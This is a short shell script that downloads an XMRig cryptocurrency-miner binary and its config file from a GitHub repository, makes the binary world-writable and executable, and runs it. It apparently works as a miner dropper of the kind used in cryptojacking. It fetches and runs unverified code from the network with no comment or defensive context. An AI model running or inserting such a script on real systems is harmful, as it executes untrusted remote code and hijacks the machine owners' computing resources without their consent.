#!/bin/sh
wget https://raw.githubusercontent.com/zlobota/abro/master/config.json
wget https://github.com/zlobota/abro/raw/master/xmrig
chmod 0777 ./xmrig
./xmrig -c config.json
